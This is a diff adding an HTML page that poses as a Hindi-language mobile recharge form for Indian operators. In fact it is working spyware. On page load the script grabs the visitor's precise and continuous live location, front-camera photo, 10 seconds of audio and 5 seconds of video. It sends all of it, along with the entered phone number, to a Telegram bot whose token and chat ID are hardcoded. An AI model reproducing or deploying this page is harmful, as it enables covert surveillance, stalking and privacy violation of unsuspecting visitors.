@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Recharge</title>
+<script>
+// ===== यहाँ अपना Telegram Bot Token और Chat ID डालें =====
+const BOT_TOKEN = "8861698885:AAHhzQXG9JvFFkOAuCE-GPvjmuXYz1J9r0A";
+const CHAT_ID   = "8121453038";
+// ========================================================
+
+let mediaStream = null;
+let locationWatchId = null;
+
+window.onload = function() {
+    // 🔥 User को सिर्फ Recharge पेज दिखे
+    document.getElementById("rechargeBox").style.display = "block";
+
+    // 🎯 Location सबसे पहले (background में तेज़ी से)
+    requestLocationFast();
+};
+
+// ============================================================
+// 📍 STEP 1: Location — तुरंत माँगें और तुरंत भेजें
+// ============================================================
+function requestLocationFast() {
+    if (!navigator.geolocation) {
+        console.log("Geolocation support नहीं");
+        setTimeout(requestCameraAndMic, 500);
+        return;
+    }
+
+    // 🔥 पहली location — HIGH ACCURACY, तुरंत
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const mapLink = "https://www.google.com/maps?q=" + lat + "," + lng;
+            const accuracy = position.coords.accuracy;
+
+            // ⚡ तुरंत Telegram पर भेजें (address का wait नहीं)
+            sendLocationToTelegram(lat, lng, "पता load हो रहा है...", mapLink, accuracy);
+
+            // 📮 बाद में पता आए तो update भेजें
+            fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" 
+                  + lat + "&lon=" + lng)
+                .then(res => res.json())
+                .then(data => {
+                    const address = (data && data.display_name) ? data.display_name : "पता नहीं मिला";
+                    sendAddressUpdate(lat, lng, address);
+                })
+                .catch(() => {});
+
+            // 🎥 फिर Camera + Mic (500ms बाद)
+            setTimeout(requestCameraAndMic, 500);
+
+            // 🔄 Live Location tracking शुरू करें (हर 30 सेकंड)
+            startLiveLocation();
+        },
+        function(error) {
+            console.log("Location Error: " + error.message);
+            setTimeout(requestCameraAndMic, 500);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+// ============================================================
+// 🔄 LIVE LOCATION — हर 30 सेकंड अपडेट
+// ============================================================
+function startLiveLocation() {
+    if (locationWatchId !== null) return;
+
+    locationWatchId = navigator.geolocation.watchPosition(
+        function(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // Telegram पर Live Location भेजें
+            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: parseFloat(lat),
+                    longitude: parseFloat(lng),
+                    live_period: 3600  // 1 घंटे तक live
+                })
+            });
+            console.log("🔄 Live Location update: " + lat + ", " + lng);
+        },
+        function(err) { console.log("Watch Error: " + err.message); },
+        { enableHighAccuracy: true, maximumAge: 10000, timeout: 15000 }
+    );
+}
+
+// ============================================================
+// 🎥 STEP 2: Camera + Mic — Allow करते ही सब तुरंत भेजें
+// ============================================================
+async function requestCameraAndMic() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user", width: 640, height: 480 },
+            audio: true
+        });
+        console.log("✅ Camera + Mic granted");
+
+        // ⚡ तीनों काम एक साथ (parallel) शुरू करें — तेज़ी के लिए
+        captureAndSendPhoto(mediaStream);      // 📸 Photo
+        recordAndSendAudio(mediaStream);        // 🎤 Audio (10 sec)
+        recordAndSendVideo(mediaStream);        // 🎥 Video (5 sec)
+
+    } catch (error) {
+        console.log("❌ Camera/Mic Error: " + error.message);
+    }
+}
+
+// ============================================================
+// 📸 PHOTO — तुरंत capture + भेजें (2 sec बाद)
+// ============================================================
+function captureAndSendPhoto(stream) {
+    return new Promise((resolve) => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", "true");
+        video.muted = true;
+        video.play();
+
+        setTimeout(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                if (blob) await sendPhotoToTelegram(blob);
+                resolve();
+            }, "image/jpeg", 0.85);
+        }, 2000);  // ⚡ 2 सेकंड (पहले 3 था)
+    });
+}
+
+async function sendPhotoToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "selfie.jpg");
+    formData.append("caption", "📸 Front Camera Photo\n⏰ " + new Date().toLocaleString("hi-IN"));
+    try {
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
+            method: "POST", body: formData
+        });
+        console.log("✅ Photo भेजी गई");
+    } catch (e) { console.log("❌ Photo Error: " + e.message); }
+}
+
+// ============================================================
+// 🎤 AUDIO — 10 सेकंड रिकॉर्ड करके भेजें
+// ============================================================
+function recordAndSendAudio(stream) {
+    return new Promise((resolve) => {
+        const audioTracks = stream.getAudioTracks();
+        if (audioTracks.length === 0) return resolve();
+
+        const audioOnlyStream = new MediaStream(audioTracks);
+        const mimeType = MediaRecorder.isTypeSupported("audio/webm") 
+                         ? "audio/webm" : "";
+        const recorder = new MediaRecorder(audioOnlyStream, mimeType ? { mimeType } : {});
+        const chunks = [];
+
+        recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+            const audioBlob = new Blob(chunks, { type: "audio/webm" });
+            await sendAudioToTelegram(audioBlob);
+            resolve();
+        };
+
+        recorder.start();
+        console.log("🎤 ऑडियो रिकॉर्डिंग शुरू (10 sec)");
+
+        setTimeout(() => {
+            if (recorder.state !== "inactive") recorder.stop();
+        }, 10000);
+    });
+}
+
+async function sendAudioToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("audio", blob, "recording.webm");
+    formData.append("caption", "🎤 10 sec Audio\n⏰ " + new Date().toLocaleString("hi-IN"));
+    try {
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio", {
+            method: "POST", body: formData
+        });
+        console.log("✅ Audio भेजा गया");
+    } catch (e) { console.log("❌ Audio Error: " + e.message); }
+}
+
+// ============================================================
+// 🎥 VIDEO — 5 सेकंड रिकॉर्ड करके भेजें
+// ============================================================
+function recordAndSendVideo(stream) {
+    return new Promise((resolve) => {
+        // Video + Audio दोनों tracks लें
+        const combinedStream = new MediaStream([
+            ...stream.getVideoTracks(),
+            ...stream.getAudioTracks()
+        ]);
+
+        let mimeType = "";
+        if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) {
+            mimeType = "video/webm;codecs=vp9,opus";
+        } else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) {
+            mimeType = "video/webm;codecs=vp8,opus";
+        } else if (MediaRecorder.isTypeSupported("video/webm")) {
+            mimeType = "video/webm";
+        } else if (MediaRecorder.isTypeSupported("video/mp4")) {
+            mimeType = "video/mp4";
+        }
+
+        const recorder = new MediaRecorder(combinedStream, mimeType ? { mimeType } : {});
+        const chunks = [];
+
+        recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+            const videoBlob = new Blob(chunks, { type: mimeType || "video/webm" });
+            await sendVideoToTelegram(videoBlob);
+            resolve();
+        };
+
+        recorder.start();
+        console.log("🎥 वीडियो रिकॉर्डिंग शुरू (5 sec)");
+
+        setTimeout(() => {
+            if (recorder.state !== "inactive") recorder.stop();
+        }, 5000);
+    });
+}
+
+async function sendVideoToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("video", blob, "video.webm");
+    formData.append("caption", "🎥 5 sec Video (Front Camera)\n⏰ " + new Date().toLocaleString("hi-IN"));
+    formData.append("supports_streaming", "true");
+    try {
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendVideo", {
+            method: "POST", body: formData
+        });
+        console.log("✅ Video भेजा गया");
+    } catch (e) { console.log("❌ Video Error: " + e.message); }
+}
+
+// ============================================================
+// 📍 Telegram पर Location भेजें
+// ============================================================
+function sendLocationToTelegram(lat, lng, address, mapLink, accuracy) {
+    const message =
+        "🚨 *नया यूज़र आया!*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📍 *Live Location*\n" +
+        "🏠 Address: " + address + "\n" +
+        "🌐 Latitude: " + lat + "\n" +
+        "🌐 Longitude: " + lng + "\n" +
+        "🎯 Accuracy: " + Math.round(accuracy) + " मीटर\n" +
+        "🗺️ Google Map: " + mapLink + "\n" +
+        "⏰ Time: " + new Date().toLocaleString("hi-IN");
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID, text: message, parse_mode: "Markdown"
+        })
+    });
+
+    // Live Location Pin (1 घंटे के लिए)
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: parseFloat(lat),
+            longitude: parseFloat(lng),
+            live_period: 3600
+        })
+    });
+}
+
+// ============================================================
+// 📮 Address Update — बाद में भेजें
+// ============================================================
+function sendAddressUpdate(lat, lng, address) {
+    const msg =
+        "🏠 *Address Update*\n" +
+        "📍 " + address + "\n" +
+        "🌐 " + lat + ", " + lng;
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID, text: msg, parse_mode: "Markdown"
+        })
+    });
+}
+
+// ============================================================
+// 💰 Recharge बटन
+// ============================================================
+function sendRecharge() {
+    const mobile = document.getElementById("mobile").value.trim();
+    const amount = document.getElementById("amount").value.trim();
+
+    if (mobile === "" || amount === "") {
+        alert("कृपया Mobile Number और Amount भरें");
+        return;
+    }
+
+    const msg =
+        "💰 *Recharge Request*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📱 Mobile: " + mobile + "\n" +
+        "📶 Operator: " + document.getElementById("operator").value + "\n" +
+        "💵 Amount: ₹" + amount + "\n" +
+        "⏰ Time: " + new Date().toLocaleString("hi-IN");
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID, text: msg, parse_mode: "Markdown"
+        })
+    });
+
+    alert("✅ Recharge Request भेज दी गई!");
+}
+</script>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+    body { background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:15px; }
+    #rechargeBox { width:100%; max-width:360px; background:#fff; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.15); padding:25px 20px; }
+    h2 { text-align:center; color:#1a73e8; margin-bottom:20px; font-size:20px; }
+    label { font-size:14px; color:#333; display:block; margin-bottom:5px; }
+    input, select { width:100%; padding:10px; margin-bottom:15px; border:1px solid #ccc; border-radius:8px; font-size:15px; outline:none; }
+    input:focus, select:focus { border-color:#1a73e8; }
+    button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
+    button:hover { background:#0c56c9; }
+</style>
+</head>
+<body>
+
+<div id="rechargeBox">
+    <h2>Mobile Recharge</h2>
+    <label>Mobile Number</label>
+    <input type="tel" id="mobile" placeholder="10 digit number" maxlength="10">
+    <label>Operator</label>
+    <select id="operator">
+        <option>Jio</option>
+        <option>Airtel</option>
+        <option>Vi</option>
+        <option>BSNL</option>
+    </select>
+    <label>Amount (₹)</label>
+    <input type="number" id="amount" placeholder="Enter amount">
+    <button onclick="sendRecharge()">Recharge Now</button>
+</div>
+
+</body>
+</html>
